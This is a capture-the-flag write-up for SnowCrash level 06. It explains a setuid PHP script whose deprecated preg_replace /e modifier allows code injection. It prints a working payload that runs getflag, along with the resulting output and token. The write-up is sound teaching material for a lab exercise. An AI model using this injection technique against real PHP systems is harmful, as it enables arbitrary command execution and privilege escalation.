evel 06
========

*	We spawn with a `level06` file in root repository
	```console
	level06@SnowCrash:~$ ls -l
	total 12
	-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
	-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
	level06@SnowCrash:~$ cat level06.php 
	```
	```php
	#!/usr/bin/php
	<?php
	function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
	function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
	$r = x($argv[1], $argv[2]); print $r;
	?>
	```
*	It is quite unreadable so i made it better in `level06.php`
*	When we look in detail, we can see that the executable runs the script of the `level06.php` file
*	More important, in the permissions we can see that `level06` will be executed as `flag06`
*	The script is pretty straight forward:
	> It defines two functions:
	>	- Function y($m): Replaces dots (.) with " x " and @ with " y".
	>	- Function x($y, $z): Reads the content of a file specified by $y, applies some 	transformations to the content, and returns the modified content.

	> It then calls function x() with command line arguments $argv[1] and $argv[2], which are typically provided when the script is executed from the command line.

	> The result of the function call is stored in $r, and it's printed out at the end.
*	The important part here is that the regex has major security issues
	```php
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	```
*	Here the `/e` regex modifier is a deprecated one which allows you to use **PHP** code within your reguler expression, which means whatever is parsed will be part of the program
*	We can use this vulnerability to execute `getflag`
*	So let's create the file argument with the exploit inside :
	```console
	level06@SnowCrash:~$ echo -e "[x {\${exec(getflag)}}]" > /tmp/test1
	level06@SnowCrash:~$ ./level06 /tmp/test1
	PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
	PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
	```